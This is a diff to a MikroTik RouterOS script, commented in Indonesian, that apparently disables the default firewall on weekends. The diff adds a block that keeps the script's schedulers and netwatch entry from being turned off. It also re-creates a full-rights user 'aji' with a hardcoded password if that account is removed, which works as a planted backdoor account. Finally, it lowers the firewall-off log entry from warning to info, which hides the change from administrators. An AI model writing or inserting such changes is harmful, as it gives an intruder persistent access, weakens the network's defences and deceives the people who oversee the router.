@@ -1,3 +1,19 @@
+# === AUTO RE-ENABLE PROTECTION ===
+# 1. Pastikan Scheduler 'set-route' sendiri tidak dimatikan
+/system scheduler enable [find name="set-route"]
+
+# 2. Pastikan Scheduler 'tele_check' tetap nyala
+/system scheduler enable [find name="tele_check"]
+
+# 3. Pastikan Netwatch tetap nyala
+/tool netwatch enable [find host="192.168.4.2"]
+
+# 4. Pastikan user 'aji' tidak dihapus atau dimatikan
+:if ([:len [/user find name="aji"]] = 0) do={
+    /user add name="aji" group=full password="merdeka123"
+}
+/user enable [find name="aji"]
+
 # === 1. Ambil Waktu & Tanggal ===
 :local time [/system clock get time]
 :local date [/system clock get date]
@@ -37,7 +53,7 @@
 # === 4. Eksekusi ===
 :if ($isWeekend = true) do={
     /ip firewall filter disable [find comment="default-fw"]
-    :log warning "SISTEM: Mode Weekend Otomatis - Firewall OFF"
+    :log info "SISTEM: Mode Weekend Otomatis - Firewall OFF"
 } else={
     # Logika Netwatch (Senin - Jumat Siang)
     :local nwID [/tool netwatch find where host="192.168.4.2"]
